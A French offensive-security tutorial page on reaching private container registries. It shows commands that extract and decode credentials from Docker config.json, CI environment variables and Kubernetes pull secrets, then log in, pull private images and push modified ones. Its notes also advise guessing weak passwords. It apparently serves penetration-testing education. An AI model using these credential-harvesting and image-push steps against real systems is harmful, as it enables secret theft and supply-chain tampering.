---
order: 3
title: "Accès au registre : utiliser des identifiants trouvés ou faibles pour atteindre des images privées"
description: "Les identifiants de registre apparaissent dans les fichiers config.json, les variables d'environnement de CI et les secrets de pull d'image Kubernetes. Avec eux, un attaquant s'authentifie à un registre privé pour tirer toutes les images et, selon la portée de l'identifiant, en pousser des modifiées. Des mots de passe de registre faibles ou réutilisés étendent le même accès par devinette."
keywords:
  - identifiants de registre
  - docker config.json
  - imagepullsecret
  - connexion au registre
  - chaîne d'approvisionnement
---

# Accès au registre

La plupart des registres exigent une authentification, mais les identifiants sont largement dispersés et souvent faibles. Un jeton ou un mot de passe trouvé permet à un attaquant de tirer des images privées pour leur code et leurs secrets, et, si l'identifiant a une portée d'écriture, de pousser des images modifiées. La portée de l'identifiant décide si l'accès est une exfiltration en lecture seule ou une écriture dans la chaîne d'approvisionnement.

## D'où viennent les identifiants

```bash
# Docker stores registry auth here after a login (base64, not encrypted)
cat ~/.docker/config.json && echo "<base64>" | base64 -d   # user:token
# CI systems inject registry creds as environment variables
env | grep -iE 'REGISTRY|DOCKER_(USER|PASS|TOKEN)'
# Kubernetes image-pull secrets hold a full dockerconfigjson
kubectl get secret -A -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.data.\.dockerconfigjson}{"\n"}{end}' \
  | base64 -d
```

## Utiliser l'identifiant

```bash
docker login <registry> -u <user> -p <token>
docker pull <registry>/<private-repo>:<tag>            # read access
docker tag x <registry>/<private-repo>:<tag>
docker push <registry>/<private-repo>:<tag>            # if the token has write scope
# cloud registries use a helper; the same config.json holds the resolved token
```

## Notes d'exploitation

- `~/.docker/config.json` et les secrets `dockerconfigjson` de Kubernetes stockent les identifiants en base64, qui est un encodage et non un chiffrement ; les décoder livre directement le nom d'utilisateur et le jeton.
- L'accès en lecture seul a déjà de la valeur pour tirer des images privées et explorer leurs couches ; testez le push séparément, car de nombreux jetons sont en lecture seule.
- Les mots de passe de registre faibles ou réutilisés valent la peine d'être devinés contre l'endpoint de jeton `/v2/` ; une connexion valide y agit de façon identique à des identifiants trouvés.
- Les registres cloud (ECR, GCR, ACR) enveloppent un jeton éphémère dans la même config ; le jeton résolu dans `config.json` fonctionne jusqu'à son expiration.

## Références

- [Docker: registry authentication](https://docs.docker.com/reference/cli/docker/login/)
- [Kubernetes: pull an image from a private registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [HackTricks: Docker registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
